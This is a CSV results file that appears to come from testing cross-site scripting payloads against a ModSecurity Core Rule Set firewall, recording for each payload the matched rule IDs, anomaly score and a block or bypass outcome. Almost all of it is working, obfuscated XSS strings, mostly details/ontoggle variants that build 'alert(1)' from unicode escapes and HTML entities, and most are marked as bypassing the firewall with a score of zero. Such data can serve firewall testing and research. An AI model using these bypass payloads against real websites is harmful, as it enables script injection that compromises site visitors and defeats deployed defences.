index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
19,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628753158.536280
20,<svg onload=new(Function)(atob('YWxlcnQoMSk='))()>,0,1,block,5,"933210,941100,941120,941160,949110","o15,34v216,50t:urlDecode,t:replaceComments,t:compressWhitespace || v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628753154.212962
33,"<svg onload=Function.call(null,atob('YWxlcnQoMSk='))()>",0,1,block,4,"941100,941120,941160,949110","v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628754292.898467
34,"<svg onload=Function.apply(null,[atob('YWxlcnQoMSk=')])()>",0,1,block,4,"941100,941120,941160,949110","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628754255.321959
196,"<svg onload=""Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628767499.325254
201,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628767833.216053
203,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628767932.324473
204,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open>,0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768062.380576
206,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768251.085815
207,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()>,0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762876836.282879
208,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'>,0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768380.379899
211,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details></details></details>",0,1,bypass,2,"941100,941120","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768694.446801
214,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details></details></details>",0,1,bypass,2,"941100,941120","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768834.767398
215,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details></details></details>,0,1,bypass,2,"941100,941120","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768935.804317
224,<details ontoggle=Function(&quot;\&#117;0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769693.472249
225,<details ontoggle=Function(&quot;\u0061\&#117;006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769716.009930
226,<details ontoggle=Function(&quot;\u0061\u006c\&#117;0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769872.796031
227,<details ontoggle=Function(&quot;\u0061\u006c\u0065\&#117;0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769820.382235
228,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\&#117;0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769978.187239
235,"<details ontoggle=""Function(&quot;\&#117;0061\&#117;006c\&#117;0065\&#117;0072\&#117;0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628770534.052833
236,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details></details></details>,0,1,bypass,2,"941100,941120","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877061.829698
237,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628770791.698573
238,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary></summary></details>",0,1,bypass,2,"941100,941120","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628770868.164084
239,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary>Click</summary></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628770951.448346
240,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details></details></summary></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771097.615281
241,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details></details></summary></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771034.670509
242,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details></details></summary></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771174.192706
243,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details></details></summary></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771288.661997
244,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details></details></summary></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877133.009318
245,"<details id=test ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details></details></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771440.213935
246,"<details class=test ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details></details></details>",0,1,bypass,2,"941100,941120","v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771588.430574
247,"<details name=test ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details></details></details>",0,1,bypass,2,"941100,941120","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o18,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771683.204943
248,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open id=x><details></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771628.871582
249,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open class=x><details></details></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771716.478376
250,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open id=x><details></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771832.149142
251,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open class=x><details></details></details>,0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771968.153527
252,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open id=x><details></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771937.927447
253,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open class=x><details></details></details>,0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772090.587169
254,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details id=x></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772189.314057
255,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details class=x></details></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772252.793602
256,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details id=x></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772399.268798
257,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details class=x></details></details>,0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772416.422030
258,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details id=x></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772446.086659
259,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details class=x></details></details>,0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772541.541035
260,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details id=x></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772631.639116
261,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details class=x></details></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772728.313480
262,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details id=x></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772841.540426
263,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details class=x></details></details>,0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772999.426268
264,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details id=x></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772949.941993
265,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details class=x></details></details>,0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773089.919461
266,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773196.564818
267,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details open></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773210.189806
268,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773351.404506
269,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details open></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773396.229694
270,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773472.137699
271,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><summary></summary></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877353.908756
272,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773673.691517
273,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773753.149338
274,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details><summary></summary></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773876.006336
275,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773850.490069
276,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773916.034874
277,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open><summary></summary></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774094.195153
278,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774118.841303
279,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details open><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774129.913662
280,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open><summary></summary></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774254.806272
281,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details open><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774323.466555
282,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774475.083655
304,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074&#40;1&#41;&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628776348.127750
